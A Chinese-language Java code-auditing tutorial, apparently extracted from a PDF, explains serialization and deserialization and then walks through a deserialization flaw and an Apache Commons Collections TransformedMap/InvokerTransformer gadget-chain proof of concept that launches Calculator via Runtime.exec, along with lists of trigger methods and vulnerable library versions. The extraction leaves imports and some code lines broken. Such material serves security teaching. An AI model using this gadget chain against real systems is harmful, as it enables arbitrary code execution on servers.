反序列化
序列化与反序列化
序列化：把对象转换为字节序列的过程称为对象的序列化
反序列化：把字节序列恢复为对象的过程称为对象的反序列化
序列化
使⽤集合保存对象，可以将集合中的所有对象序列化。
Java代码审计之基础开发
59
package 
; 
import 
.FileOutputStream;
import 
.IOException;
import 
.ObjectOutputStream; 
public class demo1 { 
    public static void main(String[] args) { 
        ObjectOutputStream oss = null; 
        try { 
            oss = new ObjectOutputStream(new FileOutputStream("./user.data")); 
            //写⼊⽂件 
            String str = new String("姓名：张三"); 
            oss.writeObject(str); 
        } catch (IOException e) { 
            e.printStackTrace(); 
        }finally { 
            if (oss!=null){ 
                try { 
                    oss.close(); 
                } catch (IOException e) { 
                    e.printStackTrace(); 
                } 
            } 
com.seria.core
java.io
java.io
java.io
Java代码审计之基础开发
60
        } 
    }
}
为什么在这⾥没有实现 Serializable  呢？因为在String⾥实现了这个接⼝
这⾥我们换⼀个例⼦，我们使⽤⼀个对象，我们去写⼀个学⽣类
package 
; 
public class Student { 
    private int nId; 
    private String sUsername; 
    private int nAge; 
    private String sAddress; 
    public Student(int nId, String sUsername, int nAge, String sAddress) { 
        this.nId = nId; 
        this.sUsername = sUsername; 
        this.nAge = nAge; 
        this.sAddress = sAddress; 
    } 
    public Student() { 
    } 
    public int getnId() { 
        return nId; 
    } 
    public void setnId(int nId) { 
        this.nId = nId; 
    } 
    public String getsUsername() { 
        return sUsername; 
    } 
    public void setsUsername(String sUsername) { 
        this.sUsername = sUsername; 
    } 
    public int getnAge() { 
        return nAge; 
    } 
    public void setnAge(int nAge) { 
        this.nAge = nAge; 
    } 
    public String getsAddress() { 
        return sAddress; 
    } 
    public void setsAddress(String sAddress) { 
        this.sAddress = sAddress; 
com.seria.core
Java代码审计之基础开发
61
    }
}
然后我们去创建⼀个学⽣对象去做序列化。
 Student stu = new Student(1,"张三",18,"中国");  
我们去写⼊。
提⽰Student类中没有Serializable接⼝所以报错了
我们需要去Student类中去实现这个接⼝
 public class Student implements Serializable  
然后再去运⾏就不会出错了
我们就⽣成了这个⽂件
Java代码审计之基础开发
62
我们上⾯学习了集合，我们如果使⽤集合的⽅式会怎么样呢？
我们来看⼀下user2这个⽂件
Java代码审计之基础开发
63
反序列化
如果向⽂件中使⽤序列化机制写⼊多个对象，那么反序列化恢复对象时，必须按照写⼊顺序读取。
Java代码审计之基础开发
64
Java代码审计之基础开发
65
package 
; 
import 
.FileInputStream;
import 
.IOException;
import 
.ObjectInputStream;
import 
.List; 
public class demo2 { 
    public static void main(String[] args) { 
        //创建⼀个输⼊流 
        ObjectInputStream ois = null; 
        try { 
            ois = new ObjectInputStream(new FileInputStream("user2.data")); 
            //开始读 
            try { 
                List stu =  (List)ois.readObject(); 
                if (stu!=null && stu.size()>0){ 
                    for (Student s:stu){ 
                        System.out.println("姓名："+s.getsUsername()+" 年龄："+s.getnAge()+" 地址："+s.getsAddress()); 
                    } 
                } 
            } catch (ClassNotFoundException e) { 
                e.printStackTrace(); 
            } 
        } catch (IOException e) { 
            e.printStackTrace(); 
        }finally { 
            if (ois!=null){ 
                try { 
                    ois.close(); 
                } catch (IOException e) { 
                    e.printStackTrace(); 
                } 
            } 
        } 
    }
}
反序列化漏洞之弹个计算器
反序列化漏洞
常⻅触发点
com.seria.core
java.io
java.io
java.io
java.util
Java代码审计之基础开发
66
常⻅第三⽅库
反序列化漏洞
如果Java应⽤对⽤⼾对输⼊（序列化过的恶意数据），即不可信数据（如序列化过的命令执⾏代码）做了反序列化处理，产⽣的⾮预
期对象的过程中可能带来任意代码执⾏。
我们来写个demo测试，⾸先我们去创建⼀个类
package 
; 
import 
.FileOutputStream;
import 
.IOException;
import 
.ObjectOutputStream;
import 
.Serializable; 
public class Ser implements Serializable { 
    private static final long seriaVersionUID = 11; 
    public int nNum = 111; 
    //重写readObject⽅法 
    private void readObject(java.io.ObjectInputStream in) throws IOException,ClassNotFoundException { 
        in.defaultReadObject();//调⽤默认的⽅法 
        //输⼊恶意代码 
        Runtime.getRuntime().exec("open /System/Applications/Calculator.app"); 
        System.out.println("test"); 
    } 
    public static void main(String[] args) { 
        ObjectOutputStream oss = null; 
        try { 
            oss = new ObjectOutputStream(new FileOutputStream("./test.data")); 
            Ser se = new Ser(); 
            oss.writeObject(se);//序列化的关键函数 
        } catch (IOException e) { 
            e.printStackTrace(); 
        }finally { 
            try { 
                oss.close(); 
            } catch (IOException e) { 
                e.printStackTrace(); 
            } 
        } 
    } 
}
在类中，我们序列化了⼀段恶意代码进去，这时候我们来做反序列化看⼀下
package 
; 
import 
.FileInputStream;
import 
.IOException;
import 
.ObjectInputStream; 
public class UnSer { 
    public static void main(String[] args) { 
        ObjectInputStream ois = null; 
        try { 
            ois = new ObjectInputStream(new FileInputStream("./test.data")); 
            try { 
                Ser s = (Ser)ois.readObject(); 
                System.out.println(s.nNum); 
            } catch (ClassNotFoundException e) { 
                e.printStackTrace(); 
            } 
        } catch (IOException e) { 
            e.printStackTrace(); 
        }finally { 
            try { 
                if (ois!=null){ 
                    ois.close(); 
                } 
com.vuln.core
java.io
java.io
java.io
java.io
com.vuln.core
java.io
java.io
java.io
Java代码审计之基础开发
67
            } catch (IOException e) { 
                e.printStackTrace(); 
            } 
        } 
    }
}
反序列化后，计算机成功弹出
常⻅触发点
ObjectInputStream.readObject
ObjectInputStream.readUnshared
XMLDecoder.readObject
Yaml.load
Java代码审计之基础开发
68
Xstream.fromXml
ObjectMapper.readValue
JSON.praseObject
......
常⻅的第三⽅库
commons-fileupload 1.3.1
commons-io 2.4
commons-collections 3.1
commons-logging 1.2
commons-beanutils 1.9.2
org.slf4j:slf4j-api 1.7.21
com.mchange:mchange-commons-java 0.2.11
org.apache.commons:commons-collections 4.0
com.mchange:c3p0 0.9.5.2
org.beanshell:bsh 2.0b5
org.codehaus.groovy:groovy 2.3.9
......
Apache-Commons-Collections反序列化漏洞分析及POC构造
漏洞分析
POC构造
Apache-Commons-Collections
Apache-Commons-Collections是⼀个拓展了Java标准库⾥的Collection结构的第三⽅基础库，它提供了很多强有⼒的数据结构类
型并且实现了各种集合⼯具类。
漏洞分析
在/org/apache/commons/collections/map/TransformedMap.class中可以看到 decorate() ⽅法，它是将⼀个Map对象，转换成 
TransformedMap  对象
我们创建⼀个新项⽬，然后创建⼀个 lib  ⽂件夹⽤来存储库。把我们的这个库放⼊这个⽂件夹。这时候我们是看不到代码的
Java代码审计之基础开发
69
然后我们就可以看到代码了。
Java代码审计之基础开发
70
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) { 
        return new TransformedMap(map, keyTransformer, valueTransformer); 
    }
这⾥我们可以看到是将Map对象转换成TransformedMap对象，这⾥传⼊了三个参数都带⼊了TransformedMap，并且返回了实例化
结果，我们跟进看⼀下
protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) { 
        super(map); 
        this.keyTransformer = keyTransformer; 
        this.valueTransformer = valueTransformer; 
    }
这⾥是将map⾥⾯的key，value转换成了Transformer的key和value
在下⾯还存在⼀个Transformer的接⼝，这个接⼝可以实现数据变换的操作，当map中的任意⼀个key或value被修改的时候，他就会
被调⽤
这⾥可以看到，实现了Transformer和Serializable接⼝
Java代码审计之基础开发
71
在下⾯可以看到 transform  ⽅法
public Object transform(Object input) { 
        if (input == null) { 
            return null; 
        } else { 
            try { 
                Class cls = input.getClass();//这⾥获取了传⼊的input的⼀个类名 
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);//通过反射的机制通过getMethod获取⼀个⽅法的对象 
                return method.invoke(input, this.iArgs);//使⽤invoke进⾏反射 
            } catch (NoSuchMethodException var4) { 
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' 
            } catch (IllegalAccessException var5) { 
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' 
            } catch (InvocationTargetException var6) { 
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' 
            } 
        } 
    }
这⾥只需要我们传⼊⽅法名、参数类型、参数就可以通过Java反射的机制去调⽤任意函数
构造POC
我们要构造⼀个实例，修改其中的数据，让它依次调⽤
Runtime → getRuntime() → exec() ，执⾏Runtime.getRuntime().exec()，就可以序列化
package 
; 
import 
.Transformer;
import 
.ConstantTransformer;
import 
.InvokerTransformer; 
public class poc { 
    public static void main(String[] args) { 
        Transformer[] transformers = new  Transformer[]{ 
                //⾸先需要通过ConstantTransformer获取Runtime类 
com.vuln.core
org.apache.commons.collections
org.apache.commons.collections.functors
org.apache.commons.collections.functors
Java代码审计之基础开发
72
                new ConstantTransformer(Runtime.class), 
                //接着来调⽤getMethod来定位查找getRuntime 
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0
                //通过反射来调⽤getRuntime中的exec 
                new InvokerTransformer("invoke",new Class[]{Object.class,Object.class},new Object[]{null,new Object[0]}), 
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /System/Applications/Calculator.app"}
        }; 
    }
}
这时候我们的恶意代码链就写好了，接下来需要将多个Transformer串联起来，形成ChainedTransformer，让他依次执⾏便可序
列化
Transformer transformedChain = new ChainedTransformer(transformers);  
接下来我们随意定义⼀个类，通过 decorated  ⽅法将Map对象转换为 TransformedMap  
package 
; 
import 
.Transformer;
import 
.ChainedTransformer;
import 
.ConstantTransformer;
import 
.InvokerTransformer;
import 
.TransformedMap; 
import 
.HashMap;
import 
.Map; 
public class poc { 
    public static void main(String[] args) { 
        //让它依次调⽤Runtime --》getRuntime() --》exec() 
        Transformer[] transformers = new Transformer[]{ 
                //⾸先需要ConstantTransformer获取Runtime类 
                new ConstantTransformer(Runtime.class), 
                //接着调⽤getMethod来定位查找getRuntime 
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0
                //反射调⽤getRuntime中的exec()  invoke 
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}), 
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"/System/Applications/Calculator.app/Conten
        }; 
        //将多个Transformer串联起来，形成ChainedTransformer 
        Transformer transformedChain = new ChainedTransformer(transformers); 
        Map innerMap = new HashMap(); 
        innerMap.put("key","value"); 
        //通过decorated将map转换为TransformedMap 第三个参数就是我们上⾯构造好的恶意代码链 
        Map outerMap = TransformedMap.decorate(innerMap,null,transformedChain); 
        //这时候如果后⾯的操作修改了转出来Map对象的outerMap值，就会ChainedTransformer内⼀系列InvokerTransformer，造成代码执⾏ 
        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); 
        onlyElement.setValue("test"); 
    }
}
这时候poc就写好了，运⾏之后弹出计算器
com.vuln.core
org.apache.commons.collections
org.apache.commons.collections.functors
org.apache.commons.collections.functors
org.apache.commons.collections.functors
org.apache.commons.collections.map
java.util
java.util